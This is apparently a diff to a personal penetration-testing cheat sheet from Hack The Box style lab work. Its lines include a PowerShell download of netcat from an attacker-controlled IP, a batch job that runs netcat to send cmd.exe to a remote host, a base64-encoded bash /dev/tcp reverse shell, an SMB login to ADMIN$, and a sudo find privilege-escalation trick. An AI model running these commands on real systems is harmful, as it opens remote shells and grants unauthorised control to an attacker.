@@ -21,6 +21,9 @@ netCat for windows:
  "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe" 
  echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.180 1234 > C:\Log-Management\job.bat
  
+ >tack is cat backwards!!
+ >strings utility will try to read bianary files!
+
 Monitor local tcp ports:
 sudo tcpdump -i tun0 port 389
 
@@ -30,6 +33,7 @@ python3 -m http.server 80
 make new password hash:
 mkpasswd -m sha-512 Password1234
 
+SHELL!!
  start up a nice shell:
     python3 -c 'import pty;pty.spawn("/bin/bash")'
  reverseshell
@@ -44,6 +48,7 @@ More upgrades on revers term = script /dev/null -c bash
 
  smbclient  \\\\10.10.10.131\\ADMIN$ -U Administrator
 
+Reverse shell oneliner!!!
  reverse shell incode 64
  echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' |base64
 
@@ -196,3 +201,6 @@ Log4J:
 https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation
 windows Netcat
 https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe
+Linux Binaries that can be abused:
+https://gtfobins.github.io/
+example: sudo find . -exec /bin/sh \; -quit
